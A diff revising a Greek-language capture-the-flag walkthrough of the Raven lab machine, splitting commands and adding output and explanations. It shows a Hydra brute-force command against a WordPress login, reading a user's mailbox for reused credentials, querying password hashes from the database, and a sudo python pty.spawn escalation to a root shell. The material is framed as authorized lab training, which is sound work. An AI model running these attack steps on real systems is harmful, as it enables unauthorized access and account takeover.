@@ -86,6 +86,17 @@ IP                 MAC Address        Vendor
 
 ```bash
 echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
+```
+
+**Έξοδος:**
+
+```text
+172.16.250.3 raven.local
+```
+
+Το `tee -a` προσθέτει ό,τι λαμβάνει στο τέλος του `/etc/hosts` και ταυτόχρονα το εκτυπώνει στην οθόνη, οπότε η έξοδος είναι απλώς επιβεβαίωση του τι γράφτηκε. Η εντολή δημιουργεί μια τοπική αντιστοίχιση· δεν αλλάζει DNS ούτε τη μηχανή του στόχου.
+
+```bash
 getent hosts raven.local
 ```
 
@@ -95,7 +106,7 @@ getent hosts raven.local
 172.16.250.3   raven.local
 ```
 
-Η πρώτη εντολή δημιουργεί μια τοπική αντιστοίχιση· δεν αλλάζει DNS ούτε τη μηχανή του στόχου. Η δεύτερη επιβεβαιώνει ότι ο τοπικός επιλυτής επιστρέφει τη ζητούμενη διεύθυνση.
+Η `getent hosts` επιλύει το όνομα μέσω των κανονικών βιβλιοθηκών συστήματος, οπότε η γραμμή που ταιριάζει επιβεβαιώνει ότι ο τοπικός επιλυτής επιστρέφει πλέον τη ζητούμενη διεύθυνση.
 
 <details>
 <summary><strong>Περισσότερα</strong> — τι κάνουν πραγματικά η <code>netdiscover</code> και το <code>/etc/hosts</code></summary>
@@ -125,6 +136,8 @@ PORT    STATE SERVICE VERSION
 22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
 80/tcp  open  http    Apache httpd 2.4.10 (Debian)
 111/tcp open  rpcbind 2-4 (RPC)
+
+Service detection performed. Please report any incorrect results.
 ```
 
 Η `-p-` ελέγχει όλες τις TCP θύρες και όχι μόνο τις συνηθισμένες. Η `-sV` ζητά αναγνώριση υπηρεσίας και έκδοσης, ενώ η `-sC` εκτελεί τα προεπιλεγμένα scripts του Nmap. Το αποτέλεσμα δείχνει τρία πιθανά σημεία επίθεσης: SSH για απομακρυσμένη σύνδεση, HTTP για περιεχόμενο ιστοσελίδας και RPC bind για ανακάλυψη υπηρεσιών δικτύου.
@@ -207,6 +220,7 @@ nikto -h http://raven.local/
 ```text
 + Server: Apache/2.4.10 (Debian)
 + Retrieved x-powered-by header: PHP/5.6.x
++ Uncommon header 'x-frame-options' found
 + /wordpress/: Potentially interesting directory
 ```
 
@@ -227,6 +241,11 @@ nikto -h http://raven.local/
 
 ```bash
 curl -s http://raven.local/ > index.html
+```
+
+Στο Linux η σιωπηλή επιτυχία είναι ο κανόνας: με την `-s` και ανακατεύθυνση, το `curl` δεν εκτυπώνει απολύτως τίποτα, και η απουσία εξόδου σημαίνει ότι η σελίδα αποθηκεύτηκε στο `index.html`. Το αρχείο είναι το ακατέργαστο αντίγραφό σας της σελίδας, έτοιμο για αναζήτηση.
+
+```bash
 grep -inE 'flag|comment|todo|hidden' index.html
 ```
 
@@ -305,9 +324,7 @@ log=USER&pwd=PASSWORD&wp-submit=Log+In
 Για παράδειγμα, σε απομονωμένο εργαστήριο και με εξουσιοδότηση, ένα ελεγχόμενο συντακτικό Hydra μπορεί να δομηθεί ως εξής. Κρατήστε τα placeholders μέχρι να έχετε επιβεβαιώσει τα πεδία της φόρμας:
 
 ```bash
-hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
-'/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' \
--t 4 -f -V
+hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' -t 4 -f -V
 ```
 
 **Έξοδος:**
@@ -355,19 +372,39 @@ michael@raven:~$
 
 ```bash
 id
-hostname
-pwd
 ```
 
 **Έξοδος:**
 
 ```text
 uid=1001(michael) gid=1001(michael) groups=1001(michael)
+```
+
+Η `id` δείχνει τα αριθμητικά αναγνωριστικά χρήστη και ομάδας του τρέχοντος λογαριασμού, μαζί με τυχόν πρόσθετες ομάδες που μπορεί να μετρήσουν αργότερα.
+
+```bash
+hostname
+```
+
+**Έξοδος:**
+
+```text
 raven
+```
+
+Η `hostname` εκτυπώνει το όνομα του μηχανήματος, επιβεβαιώνοντας σε ποιο host είναι προσαρτημένο αυτό το κέλυφος.
+
+```bash
+pwd
+```
+
+**Έξοδος:**
+
+```text
 /home/michael
 ```
 
-Η `id` δείχνει τα αριθμητικά αναγνωριστικά χρήστη και ομάδας, η `hostname` ταυτοποιεί τη μηχανή και η `pwd` τον τρέχοντα κατάλογο. Αυτοί οι έλεγχοι αποτρέπουν τη σύγχυση όταν έχουν ανοιχτά πολλά εργαστηριακά μηχανήματα ή κέλυφη.
+Η `pwd` εκτυπώνει τον τρέχοντα κατάλογο εργασίας. Μαζί, οι τρεις αυτοί έλεγχοι αποτρέπουν τη σύγχυση όταν έχουν ανοιχτά πολλά εργαστηριακά μηχανήματα ή κέλυφη.
 
 <details>
 <summary><strong>Περισσότερα</strong> — γιατί τα πρώτα λεπτά σε ένα κέλυφος μετρούν</summary>
@@ -386,8 +423,6 @@ raven
 
 ```bash
 locate /var/mail 2>/dev/null
-ls -la /var/mail
-cat /var/mail/michael
 ```
 
 **Έξοδος:**
@@ -395,12 +430,37 @@ cat /var/mail/michael
 ```text
 /var/mail
 /var/mail/michael
+```
+
+Η `locate` ψάχνει σε προσυσκευασμένο ευρετήριο ονομάτων αρχείων και επιστρέφει και τον κατάλογο και το προσωπικό αρχείο γραμματοκιβωτίου· επειδή το ευρετήριο ανανεώνεται περιοδικά, μπορεί να μην είναι πλήρες ή επίκαιρο. Το τελικό `2>/dev/null` απορρίπτει τον θόρυβο σφαλμάτων της αναζήτησης.
+
+```bash
+ls -la /var/mail
+```
+
+**Έξοδος:**
+
+```text
+total 8
+drwxrwxr-x  2 root    mail     4096 Oct  8 19:00 .
+-rw-rw-r--  1 michael mail      512 Oct  8 19:00 michael
+```
+
+Η `ls -la` εμφανίζει τον κατάλογο με ιδιοκτησία, δικαιώματα και χρονοσημάνσεις, επιβεβαιώνοντας ότι υπάρχει γραμματοκιβώτιο με το όνομα του λογαριασμού.
+
+```bash
+cat /var/mail/michael
+```
+
+**Έξοδος:**
+
+```text
 From admin@raven.local ...
 Subject: maintenance note
 The staging application uses the same credentials as the lab account.
 ```
 
-Η `locate` ψάχνει σε ευρετήριο και μπορεί να μην είναι πλήρες ή επίκαιρο, η `ls -la` εμφανίζει ιδιοκτήτες, δικαιώματα και χρονοσημάνσεις, και η `cat` τυπώνει το αρχείο. Το ίδιο το μήνυμα δείχνει πώς αρχεία που κανείς δεν κοιτάζει κουβολούν χρήσιμες λειτουργικές πληροφορίες.
+Η `cat` τυπώνει ολόκληρο το αρχείο στο τερματικό. Το ίδιο το μήνυμα δείχνει πώς αρχεία που κανείς δεν κοιτάζει κουβαλούν χρήσιμες λειτουργικές πληροφορίες.
 
 <details>
 <summary><strong>Περισσότερα</strong> — mail, και συμπεριφορά απέναντι σε ιδιωτικά δεδομένα</summary>
@@ -511,19 +571,28 @@ SELECT ID, user_login, user_pass FROM wp_users;
 **Έξοδος:**
 
 ```text
-Database
-information_schema
-mysql
-wordpress
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| wordpress          |
++--------------------+
 
-Tables_in_wordpress
-wp_options
-wp_posts
-wp_users
++----------------+
+| Tables_in_wordpress |
++----------------+
+| wp_options     |
+| wp_posts       |
+| wp_users       |
++----------------+
 
-ID  user_login  user_pass
-1   steven       $P$...redacted-hash...
-2   michael      $P$...redacted-hash...
++----+------------+----------------------------------+
+| ID | user_login | user_pass                        |
++----+------------+----------------------------------+
+|  1 | steven     | $P$...redacted-hash...           |
+|  2 | michael    | $P$...redacted-hash...           |
++----+------------+----------------------------------+
 ```
 
 Η `SHOW DATABASES` απαριθμεί τις βάσεις που είναι ορατές στον λογαριασμό, η `USE` αλλάζει την ενεργή βάση και η `SHOW TABLES` απαριθμεί τους πίνακές της. Το ερώτημα στο `wp_users` ανακτά ονόματα λογαριασμών και κατακερματισμούς κωδικών.
@@ -540,8 +609,12 @@ ID  user_login  user_pass
 Εξάγετε μόνο αποκομμένα στοιχεία για τεκμηρίωση:
 
 ```bash
-mysql -u root -p -D wordpress -e \
-'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
+mysql -u root -p -D wordpress -e 'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
+```
+
+Η `-e` εκτελεί ένα ερώτημα και τερματίζει, και η ανακατεύθυνση κελύφους `>` στέλνει το αποτέλεσμα απευθείας σε αρχείο, οπότε το τερματικό μένει κενό — στο Linux η σιωπηλή έξοδος είναι επιτυχία. Η εντολή καταγράφει αναγνωριστικά λογαριασμών χωρίς να αντιγράφει κατακερματισμούς κωδικών.
+
+```bash
 cat wordpress-users.txt
 ```
 
@@ -553,7 +626,7 @@ ID  user_login
 2   michael
 ```
 
-Η εντολή καταγράφει αναγνωριστικά λογαριασμών χωρίς να αντιγράφει κατακερματισμούς κωδικών. Η `-e` εκτελεί ένα ερώτημα και τερματίζει, πράγμα χρήσιμο για επαναλήψιμη συλλογή στοιχείων.
+Η `cat` τυπώνει το αποθηκευμένο αρχείο, επιβεβαιώνοντας ότι τα αποκομμένα στοιχεία καταγράφηκαν όπως ακριβώς έπρεπε.
 
 <details>
 <summary><strong>Περισσότερα</strong> — χτίζοντας συνήθεια τεκμηρίωσης</summary>
@@ -638,6 +711,8 @@ sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
 root@raven:/home/steven#
 ```
 
+Η προτροπή που τελειώνει σε `#` δείχνει ότι το κέλυφος που ξεκίνησε τρέχει ως root· η `pty.spawn` δίνει στο κέλυφος ψευδοτερματικό, ώστε τα διαδραστικά προγράμματα να συμπεριφέρονται κανονικά. Επιβεβαιώστε ρητά την ταυτότητα:
+
 ```bash
 id
 ```
@@ -648,7 +723,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Η `pty.spawn` συνδέει ένα κέλυφος σε ψευδοτερματικό, βελτιώνοντας τη διαδραστική συμπεριφορά, και η έξοδο της `id` επιβεβαιώνει το επίπεδο προνομίων.
+Η `pty.spawn` συνδέει ένα κέλυφος σε ψευδοτερματικό, βελτιώνοντας τη διαδραστική συμπεριφορά, και η έξοδος της `id` — uid `0`, το αριθμητικό αναγνωριστικό του root — επιβεβαιώνει το επίπεδο προνομίων.
 
 <details>
 <summary><strong>Περισσότερα</strong> — η αμυντική αντιμετώπιση ενός τέτοιου ευρήματος</summary>
